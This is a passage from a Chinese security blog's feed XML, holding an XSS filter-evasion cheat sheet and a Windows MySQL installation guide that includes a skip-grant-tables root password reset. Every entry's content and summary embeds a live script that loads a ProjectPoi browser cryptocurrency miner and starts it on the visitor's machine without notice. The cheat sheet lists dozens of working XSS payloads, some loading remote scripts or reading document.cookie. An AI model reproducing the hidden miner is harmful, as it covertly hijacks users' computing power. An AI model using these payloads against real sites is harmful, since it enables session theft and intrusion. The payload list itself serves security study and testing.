title="使用了最小的十六进制的制表符来欺骗过滤器"></a>使用了最小的十六进制的制表符来欺骗过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x9ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><table><thead><tr><th>Type</th><th>Horizontal Tab</th><th>New line</th><th>Carriage Return</th></tr></thead><tbody><tr><td>URL</td><td><code>%09</code></td><td><code>%10</code></td><td><code>%13</code></td><td></td></tr><tr><td>Minimal Sized Hex</td><td><code>&amp;#x9</code></td><td><code>&amp;#xA</code></td><td><code>&amp;#xD</code></td></tr><tr><td>Maximum Sized Hex</td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#x000000A;</code></td><td><code>&amp;#x000000D;</code></td></tr><tr><td>Minimum Sized Decimal</td><td><code>&amp;#9</code></td><td><code>&amp;#10</code></td><td><code>&amp;#13</code></td></tr><tr><td>Maximum Sized Decimal</td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#x0000009;</code></td><td><code>&amp;#0000009;</code></td></tr></tbody></table><h2 id="使用空字符"><a href="#使用空字符" class="headerlink" title="使用空字符"></a>使用空字符</h2><p>另一个可以绕过的就是空字符，这是最有效的工具了。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>空字符 (%00) 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code> 标签. 只在 <strong>IE 6.0, IE 7.0</strong> 可以。</p><h2 id="双引号配对的bug"><a href="#双引号配对的bug" class="headerlink" title="双引号配对的bug"></a>双引号配对的bug</h2><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</div></pre></td></tr></table></figure><p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事<br>实不是这样，所有的浏览器都在试图修正这一问题。<br>结果最终如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&amp;gt;</div></pre></td></tr></table></figure></p><h2 id="不全面的过滤器"><a href="#不全面的过滤器" class="headerlink" title="不全面的过滤器"></a>不全面的过滤器</h2><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令里插入代码。我们通过 base64 加密<code>&lt;script&gt;alert(‘XSS’)&lt;/script&gt;.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot;</div><div class="line">CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</div></pre></td></tr></table></figure><h2 id="畸形的A标签"><a href="#畸形的A标签" class="headerlink" title="畸形的A标签"></a>畸形的A标签</h2><p>跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p><p>此外，chrome浏览器喜欢去不全确实的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你不全缺失的引号在URL和script中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p><h2 id="使用双引号"><a href="#使用双引号" class="headerlink" title="使用双引号"></a>使用双引号</h2><h6 id="如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。"><a href="#如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。" class="headerlink" title="如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。"></a>如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(&quot;Look its, &apos;XSS&apos;&quot;)`&gt;</div></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><h6 id="转义字符有时候很有用，可以对付一些简单的过滤器"><a href="#转义字符有时候很有用，可以对付一些简单的过滤器" class="headerlink" title="转义字符有时候很有用，可以对付一些简单的过滤器"></a>转义字符有时候很有用，可以对付一些简单的过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\&quot;XSS\&quot;)`&gt;</div></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\\&quot;XSS\\&quot;)`&gt;</div></pre></td></tr></table></figure><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h4 id="使用-utf-7-编码可以绕过"><a href="#使用-utf-7-编码可以绕过" class="headerlink" title="使用 utf-7 编码可以绕过"></a>使用 utf-7 编码可以绕过</h4><h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div></pre></td></tr></table></figure><p>使用UTF-7编码后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</div></pre></td></tr></table></figure><p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</div></pre></td></tr></table></figure><h4 id="一个列表"><a href="#一个列表" class="headerlink" title="一个列表:"></a>一个列表:</h4><table><thead><tr><th>字符</th><th>实体引用</th></tr></thead><tbody><tr><td>空格</td><td>%20</td></tr><tr><td>/</td><td>%2F</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>?</td><td>%3F</td></tr></tbody></table><h2 id="我也不知道咋分类了"><a href="#我也不知道咋分类了" class="headerlink" title="我也不知道咋分类了"></a>我也不知道咋分类了</h2><h4 id="内嵌TAB"><a href="#内嵌TAB" class="headerlink" title="内嵌TAB"></a>内嵌TAB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="内嵌被编码的TAB"><a href="#内嵌被编码的TAB" class="headerlink" title="内嵌被编码的TAB"></a>内嵌被编码的TAB</h4><p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p><h4 id="内嵌换行符去分开xss代码"><a href="#内嵌换行符去分开xss代码" class="headerlink" title="内嵌换行符去分开xss代码"></a>内嵌换行符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="编码回车符去分开xss代码"><a href="#编码回车符去分开xss代码" class="headerlink" title="编码回车符去分开xss代码"></a>编码回车符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="没有分割的javascript指令"><a href="#没有分割的javascript指令" class="headerlink" title="没有分割的javascript指令"></a>没有分割的javascript指令</h4><p>null字符也可以作为一个xss向量，但是不像上边那样。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器用过变动像这个例子中的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div></pre></td></tr></table></figure></p><h4 id="图片元素中javascript之前的空格和元字符为xss"><a href="#图片元素中javascript之前的空格和元字符为xss" class="headerlink" title="图片元素中javascript之前的空格和元字符为xss"></a>图片元素中javascript之前的空格和元字符为xss</h4><p>xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p><h4 id="非字母数字字符xss"><a href="#非字母数字字符xss" class="headerlink" title="非字母数字字符xss"></a>非字母数字字符xss</h4><p>Firefox html解析器设定一个非数字字母字符不是有效的在一个html关键字后面，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。</p><h5 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/XSS SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。从而借此绕过xss过滤器。注意这也是适用于重音符如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div></pre></td></tr></table></figure></p><p>Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是他们仅允许一个一个斜杠在html标签和参数之间，在不使用空格的情况下。这可能是有用的在那些不允许输入空格的系统中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="附加的开括号"><a href="#附加的开括号" class="headerlink" title="附加的开括号"></a>附加的开括号</h4><p>Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。代码中的双斜杠可以抑制额外尖括号导致的javascript错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="没关闭的script标签"><a href="#没关闭的script标签" class="headerlink" title="没关闭的script标签"></a>没关闭的script标签</h4><p>对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;“这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js?&lt; B &gt;</div></pre></td></tr></table></figure></p><h4 id="script标签中的协议解析"><a href="#script标签中的协议解析" class="headerlink" title="script标签中的协议解析"></a>script标签中的协议解析</h4><p>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</div></pre></td></tr></table></figure></p><h4 id="半开的HTML-JavaScript-xss向量"><a href="#半开的HTML-JavaScript-xss向量" class="headerlink" title="半开的HTML/JavaScript xss向量"></a>半开的HTML/JavaScript xss向量</h4><p>不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指定在图片标签中这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以插入这个xss向量在任何html标签后面。甚至没有用”&gt;”关闭标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 这也是有效的去对付真实的xss过滤器，我曾经碰见过试用半开的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</div></pre></td></tr></table></figure></p><h4 id="双开尖括号"><a href="#双开尖括号" class="headerlink" title="双开尖括号"></a>双开尖括号</h4><p>使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=http://damit5.ml/xss.html &lt;</div></pre></td></tr></table></figure></p><h4 id="转义javascript中的转义"><a href="#转义javascript中的转义" class="headerlink" title="转义javascript中的转义"></a>转义javascript中的转义</h4><p>当一个应用程序是输出用户自定义的信息到javascript代码中，例如：<br><code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code><br>如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过转义被转义的字符来绕过它。从而使最终的输入代码类似于<code>&lt;SCRIPT&gt;var a=&quot;\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code> 。最终\转义了双引号前被服务器添加的\，而双引号则不会被转义，从而触发xss向量。xss定位器使用这个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\&quot;;alert(&apos;XSS&apos;);//</div></pre></td></tr></table></figure></p><h4 id="闭合title标签"><a href="#闭合title标签" class="headerlink" title="闭合title标签"></a>闭合title标签</h4><p>这是一个简单的xss向量，可以引入一个恶意的xss攻击。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="INPUT-image"><a href="#INPUT-image" class="headerlink" title="INPUT image"></a>INPUT image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="BODY-image"><a href="#BODY-image" class="headerlink" title="BODY image"></a>BODY image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="IMG-DYNSRC-视频剪辑"><a href="#IMG-DYNSRC-视频剪辑" class="headerlink" title="IMG DYNSRC(视频剪辑)"></a>IMG DYNSRC(视频剪辑)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="IMG-lowsrc（低分辨率图片）"><a href="#IMG-lowsrc（低分辨率图片）" class="headerlink" title="IMG lowsrc（低分辨率图片）"></a>IMG lowsrc（低分辨率图片）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="List-style-image"><a href="#List-style-image" class="headerlink" title="List-style-image"></a>List-style-image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure><h4 id="List-style-image-1"><a href="#List-style-image-1" class="headerlink" title="List-style-image"></a>List-style-image</h4><p>为带有符号的列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为javascript指令。这不是一个特别有用的xss向量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure></p><h4 id="VBscript-in-an-image"><a href="#VBscript-in-an-image" class="headerlink" title="VBscript in an image"></a>VBscript in an image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</div></pre></td></tr></table></figure><h4 id="Livescript-仅适用于老版本的Netscape"><a href="#Livescript-仅适用于老版本的Netscape" class="headerlink" title="Livescript (仅适用于老版本的Netscape)"></a>Livescript (仅适用于老版本的Netscape)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</div></pre></td></tr></table></figure><h4 id="BGSOUND-背景音乐"><a href="#BGSOUND-背景音乐" class="headerlink" title="BGSOUND(背景音乐)"></a>BGSOUND(背景音乐)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="amp-JavaScript-包含"><a href="#amp-JavaScript-包含" class="headerlink" title="&amp; JavaScript 包含"></a>&amp; JavaScript 包含</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</div></pre></td></tr></table></figure><h4 id="样式表"><a href="#样式表" class="headerlink" title="样式表"></a>样式表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><div id="aplayer9" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer9"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h4 id=&quot;写在最前面&quot;&gt;&lt;a href=&quot;#写在最前面&quot; class=&quot;headerlink&quot; title=&quot;写在最前面:::&quot;&gt;&lt;/a&gt;写在最前面:::&lt;/h4&gt;&lt;p&gt;下文中 &lt;code&gt;alert&lt;/code&gt; 都可以由 &lt;code&gt;prompt&lt;/code&gt; 代替&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://damit5.ml/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows MySQL 的安装</title>
    <link href="http://damit5.ml/2017/09/30/Windows-MySQL-%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>http://damit5.ml/2017/09/30/Windows-MySQL-的安装/</id>
    <published>2017-09-30T06:06:45.000Z</published>
    <updated>2017-11-06T05:31:43.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><p>第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">启动: net start MySQL</div><div class="line"></div><div class="line">停止: net stop MySQL</div><div class="line"></div><div class="line">卸载: sc delete MySQL</div></pre></td></tr></table></figure><h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h4><p>打开mysql官网下载页面：<a href="http://dev.mysql.com/downloads/mysql/" target="_blank" rel="external">http://dev.mysql.com/downloads/mysql/</a></p><p>选择相应的版本和平台</p><p>下载压缩包，解压</p><h4 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h4><p>打开刚刚解压的文件夹，发现里面有my-default.ini配置文件，这个是默认的配置文件，复制一个自己的改名字为my.ini（没有的话自己创建一个）</p><p>编写 my.ini 配置以下基本信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[mysql]</div><div class="line"># 设置mysql客户端默认字符集</div><div class="line">default-character-set=utf8</div><div class="line"> </div><div class="line">[mysqld]</div><div class="line"># 设置3306端口</div><div class="line">port = 3306</div><div class="line"># 设置mysql的安装目录</div><div class="line">basedir=D:\Program Files\MySQL\mysql-5.7.19-winx64</div><div class="line"># 设置mysql数据库的数据的存放目录</div><div class="line">datadir=D:\Program Files\MySQL\mysql-5.7.19-winx64\Data</div><div class="line"># 允许最大连接数</div><div class="line">max_connections=20</div><div class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</div><div class="line">character-set-server=utf8</div><div class="line"># 创建新表时将使用的默认存储引擎</div><div class="line">default-storage-engine=INNODB</div></pre></td></tr></table></figure></p><h4 id="3-安装启动mysql"><a href="#3-安装启动mysql" class="headerlink" title="3.安装启动mysql"></a>3.安装启动mysql</h4><p>用管理员身份打开CMD</p><p>cd到bin目录</p><p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysqld install #出现安装成功即可</div><div class="line"></div><div class="line">net start mysql #启动mysql</div></pre></td></tr></table></figure></p><blockquote><p>结果发现在cmd里启动发现没法启动</p></blockquote><p>网上搜索了下发现是5.7版本才有这个问题，要在bin目录下手动初始化data目录</p><p>cd到bin目录下先初始化</p><ol><li><p><code>mysqld --initialize-insecure</code>自动生成无密码的root用户，</p></li><li><p><code>mysqld --initialize</code>自动生成带随机密码的root用户</p></li></ol><p>这里选择1. <code>mysqld --initialize-insecure</code></p><p>初始化后再运行<code>net start mysql</code> 成功启动mysql  ..</p><h4 id="4-进入mysql环境"><a href="#4-进入mysql环境" class="headerlink" title="4.进入mysql环境"></a>4.进入mysql环境</h4><p>配置环境变量</p><p>将bin目录加入到环境变量中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -u root  #因为此时没有密码</div></pre></td></tr></table></figure><hr><p>windows 下设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">方法1： 用SET PASSWORD命令</div><div class="line">首先登录MySQL。</div><div class="line">格式：mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;);</div><div class="line">例子：mysql&gt; set password for root@localhost = password(&apos;123&apos;);</div><div class="line"></div><div class="line">方法2：用mysqladmin</div><div class="line">格式：mysqladmin -u用户名 -p旧密码 password 新密码</div><div class="line">例子：mysqladmin -uroot -p123456 password 123</div><div class="line"></div><div class="line">方法3：用UPDATE直接编辑user表</div><div class="line">首先登录MySQL。</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; update user set password=password(&apos;123&apos;) where user=&apos;root&apos; and host=&apos;localhost&apos;;</div><div class="line">mysql&gt; flush privileges;</div><div class="line"></div><div class="line">方法4：在忘记root密码的时候，可以这样</div><div class="line">以windows为例：</div><div class="line">1. 关闭正在运行的MySQL服务。</div><div class="line">2. 打开DOS窗口，转到mysql\bin目录。</div><div class="line">3. 输入mysqld --skip-grant-tables 回车。--skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。</div><div class="line">4. 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\bin目录。</div><div class="line">5. 输入mysql回车，如果成功，将出现MySQL提示符 &gt;。</div><div class="line">6. 连接权限数据库： use mysql; 。</div><div class="line">6. 改密码：update user set password=password(&quot;123&quot;) where user=&quot;root&quot;;（别忘了最后加分号） 。</div><div class="line">7. 刷新权限（必须步骤）：flush privileges;　。</div><div class="line">8. 退出 quit。</div><div class="line">9. 注销系统，再进入，使用用户名root和刚才设置的新密码123登录。</div></pre></td></tr></table></figure></p><div id="aplayer11" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer11"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
